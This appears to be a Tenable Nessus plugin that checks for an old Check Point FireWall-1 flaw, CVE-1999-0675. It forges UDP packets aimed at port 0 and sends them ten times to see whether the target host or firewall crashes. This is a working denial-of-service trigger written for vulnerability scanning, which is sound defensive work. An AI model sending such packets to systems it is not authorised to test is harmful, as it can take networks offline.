#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10074);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-1999-0675");
 script_bugtraq_id(576);
 script_xref(name:"OSVDB", value:"1038");
 
 script_name(english:"Check Point FireWall-1 UDP Port 0 DoS");
 script_summary(english:"Crashes the remote host by sending a UDP packet going to port 0");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote firewall has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to crash either the remote host or the firewall\n",
     "in between us and the remote host by sending an UDP packet going to\n",
     "port 0.\n\n",
     "This flaw may allow an attacker to shut down your network."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999-q3/0378.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:string(
     "Contact your firewall vendor if it was the firewall which crashed,\n",
     "or filter incoming UDP traffic if the remote host crashed."
   )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"Firewalls");

 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_require_keys("Settings/ParanoidReport");
 
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if ( TARGET_IS_IPV6 ) exit(0);
start_denial();


ip = forge_ip_packet(ip_v   : 4,
		     ip_hl  : 5,
		     ip_tos : 0,
		     ip_id  : 0x4321,
		     ip_len : 28,
		     ip_off : 0,
		     ip_p   : IPPROTO_UDP,
		     ip_src : this_host(),
		     ip_ttl : 0x40);

# Forge the UDP packet
	    
udp = forge_udp_packet( ip : ip,
			uh_sport : 1234, uh_dport : 0,
			uh_ulen : 8);		     


#
# Send this packet 10 times
#

send_packet(udp, pcap_active:FALSE) x 10;	

#
# wait
#
sleep(5);

#
# And check...
#
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
